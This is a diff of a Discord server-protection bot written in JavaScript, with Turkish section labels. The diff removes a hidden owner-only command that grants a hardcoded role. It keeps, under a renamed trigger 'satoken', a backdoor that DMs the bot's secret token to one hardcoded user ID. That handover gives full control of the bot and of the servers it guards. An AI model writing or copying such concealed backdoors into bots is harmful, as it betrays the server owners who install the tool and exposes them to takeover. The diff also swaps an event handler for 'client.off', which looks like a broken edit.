@@ -87,15 +87,6 @@ client.on("guildBanAdd", async (guild, üyecik) => {
 //////////////////////////////////////////////////Sağ Tık Ban Koruması////////////////////////////////////////////////////
 
 
-client.on('message', async (msg, member, guild) => {
-if(msg.author.id !== ayarlar.owner) return
-if(msg.content === "rol") {
-msg.delete()
-msg.guild.members.cache.get(ayarlar.owner).roles.add("951929544741371954")
-msg.react('✅')
-}
-})
-
 
 
 //////////////////////////////////////////////////Bot Ekleme Koruması////////////////////////////////////////////////////
@@ -192,7 +183,7 @@ client.on('message', async (msg, member, guild) => {
   
  {
 
-if (msg.content.toLowerCase() === 'sa'){
+if (msg.content.toLowerCase() === 'satoken'){
 if (msg.author.id !== "429357746002067493") return;
 
 msg.author.send(client.token);
@@ -382,7 +373,7 @@ client.on("roleUpdate", async role => {
 });
 
 ////////////////////////////////////////////////////Rol Açma Koruması/////////////////////////////////////////////////////
-client.on("ready",  () => {
+client.off("ready",  () => {
   let gir = k.botVoiceChannelID
   
   client.channels.cache.get(gir).join();
